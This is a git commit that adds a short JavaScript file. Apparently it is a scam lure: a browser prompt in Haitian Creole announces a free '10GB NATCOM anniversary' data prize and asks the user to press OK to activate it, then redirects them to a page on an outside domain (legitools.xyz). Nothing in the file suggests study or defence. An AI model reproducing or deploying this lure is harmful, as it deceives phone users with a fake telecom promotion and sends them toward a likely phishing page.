a7f21c7f9650114b7966dab9a422579dcefb2bf0
harryjohnson86 <mfonjohnson86@gmail.com>
2025-03-23 03:41:36 -0700

    Create 10gb-anniversary-data.com.js

---
+++ 10gb-anniversary-data.com.js
@@ -0,0 +1,5 @@
+var password = '10GB done gratis'
+password=prompt('SMS: Felisitasyon Nimewo ou a Elijib pou resevwa 10GB Done Gratis 2025 NATCOM ANIVERSÈ RECONANSYON, Tanpri Peze OK pou aktive.. ','10GB done gratis');
+if (password != '10GB done gratis') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
